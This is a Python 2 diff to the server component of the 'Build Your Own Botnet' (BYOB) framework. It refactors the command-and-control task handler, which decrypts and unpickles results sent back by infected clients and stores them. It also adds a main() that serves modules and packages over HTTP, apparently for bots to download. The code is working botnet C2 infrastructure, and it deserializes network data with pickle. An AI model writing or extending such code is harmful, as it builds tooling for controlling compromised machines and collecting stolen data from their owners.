@@ -23,6 +23,7 @@ __doc__ = '''
 '''
 
 # standard library
+import __builtin__
 import os
 import sys
 import json
@@ -30,6 +31,7 @@ import time
 import struct
 import socket
 import select
+import argparse
 import threading
 import subprocess
 import collections
@@ -40,21 +42,10 @@ import util
 
 # packages
 packages = ['SocketServer']
-missing  = []
-for __package in packages:
-    try:
-        exec("import {}".format(__package), globals())
-    except ImportError:
-        missing.append(__package)
+util.imports(packages, __builtin__)
 
-# fix missing dependencies
-if missing:
-    proc = subprocess.Popen('{} -m pip install {}'.format(sys.executable, ' '.join(missing)), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-    proc.wait()
-    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
 
-# main
-class Server(SocketServer.ThreadingTCPServer):
+class Server(__builtin__.SocketServer.ThreadingTCPServer):
 
     """ 
     Base server which can be combined with handlers from byob.core.handlers
@@ -64,19 +55,22 @@ class Server(SocketServer.ThreadingTCPServer):
 
     allow_reuse_address = True
 
-    def __init__(self, host='0.0.0.0', port=1337, handler=SimpleHTTPServer.SimpleHTTPRequestHandler):
+    def __init__(self, host='0.0.0.0', port=1337, root=None, handler=SimpleHTTPServer.SimpleHTTPRequestHandler):
         """
 
         `Optional`
         :param str host:        server hostname or IP address
         :param int port:        server port number
+        :param str root:        server root directory 
+        :param handler:         request handler class
 
         Returns a byob.server.Server instance
         
         """
-        SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)
+        __builtin__.SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)
+        if os.path.isdir(root):
+            os.chdir(root)
 
-    @util.threaded
     def serve_until_stopped(self):
         """
         Run server while byob.server.Server.abort is False;
@@ -93,11 +87,12 @@ class Server(SocketServer.ThreadingTCPServer):
                 break
 
 
-class TaskHandler(SocketServer.StreamRequestHandler):
+class TaskHandler(__builtin__.SocketServer.StreamRequestHandler):
     """ 
     Task handler for the C2 server that handles
     incoming tasks from clients operating in 
     passive mode
+
     """
 
     def handle(self):
@@ -105,21 +100,51 @@ class TaskHandler(SocketServer.StreamRequestHandler):
         Unpack, decrypt, and unpickle an incoming
         completed task from a client, and pass it
         to the database for storage
+
         """
         while True:
             hdr_size = struct.calcsize('!L')
-            hdr      = self.connection.recv(hdr_size)
+            hdr = self.connection.recv(hdr_size)
             msg_size = struct.unpack('!L', hdr)[0]
-            msg      = self.connection.recv(msg_size)
+            msg = self.connection.recv(msg_size)
             while len(msg) < msg_size:
                 msg += self.connection.recv(msg_size - len(msg))
             session = self.server._get_client_by_connection(self.connection)
-            task    = pickle.loads(security.decrypt_aes(msg, session.key))
+            task = pickle.loads(security.decrypt_aes(msg, session.key))
             if isinstance(task, logging.LogRecord):
                 self.server.database.handle_task(task.__dict__)
             elif isinstance(task, dict):
                 self.server.database.handle_task(task)
             else:
-                util.debug("invalid task format - expected {}, received {}".format(dict, type(task)))
+                util.__logger__.debug("invalid task format - expected {}, received {}".format(dict, type(task)))
 
 
+def main():
+    
+    parser = argparse.ArgumentParser(prog='handlers.py', description='Resource Handlers (Build Your Own Botnet)', add_help=True)
+    
+    parser.add_argument(
+        '--host',
+        type=str,
+        help='host to serve resources from',
+        default='localhost')
+    
+    parser.add_argument(
+        '--port',
+        type=int,
+        help='port number to listen on',
+        default=8000)
+    
+    options = parser.parse_args()
+
+    module_root = os.path.abspath('modules')
+    for i in sys.path:
+        if os.path.isdir(i) and os.path.basename(i) == 'site-packages':
+            package_root = os.path.abspath(i)
+
+    module_handler = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=module_root, shell=True)
+    package_handler = Server(host=options.host, port=options.port + 2, root=package_root)
+    package_handler.serve_until_stopped()
+
+if __name__ == "__main__":
+    main()
